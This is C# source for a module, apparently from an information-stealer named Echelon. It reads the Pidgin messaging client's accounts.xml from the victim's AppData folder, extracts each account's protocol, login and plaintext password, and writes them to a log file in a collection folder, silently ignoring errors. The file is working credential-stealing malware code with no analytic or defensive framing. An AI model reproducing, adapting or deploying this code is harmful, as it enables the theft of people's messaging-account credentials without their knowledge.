

using System;
using System.IO;
using System.Text;
using System.Xml;

namespace Echelon
{
    internal class Pidgin
    {
        public static int PidginCount;
        public static int PidginAkks;
        private static readonly string PidginPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @".purple\accounts.xml");

        private static StringBuilder SBTwo = new StringBuilder();

        public static void Start(string directorypath)  // Works
        {
            if (File.Exists(PidginPath))
            {
                Directory.CreateDirectory(directorypath + "\\Jabber\\Pidgin\\");
                GetDataPidgin(PidginPath, directorypath + "\\Jabber\\Pidgin" + "\\Pidgin.log");
            }
        }

        public static void GetDataPidgin(string PathPn, string SaveFile)
        {
            try
            {
                if (File.Exists(PathPn))
                    try
                    {
                        var xs = new XmlDocument();
                        xs.Load(new XmlTextReader(PathPn));
                        foreach (XmlNode nl in xs.DocumentElement.ChildNodes)
                        {
                            var Protocol = nl.ChildNodes[0].InnerText;
                            var Login = nl.ChildNodes[1].InnerText;
                            var Password = nl.ChildNodes[2].InnerText;
                            if (!string.IsNullOrEmpty(Protocol) && !string.IsNullOrEmpty(Login) && !string.IsNullOrEmpty(Password))
                            {
                                SBTwo.AppendLine($"Protocol: {Protocol}");
                                SBTwo.AppendLine($"Login: {Login}");
                                SBTwo.AppendLine($"Password: {Password}\r\n");
                                PidginAkks++;
                                PidginCount++;
                            }
                            else
                            {
                                break;
                            }
                        }
                        if (SBTwo.Length > 0)
                            try
                            {
                                File.AppendAllText(SaveFile, SBTwo.ToString());
                            }
                            catch { }
                    }
                    catch { }
            }
            catch { }
        }
    }
}
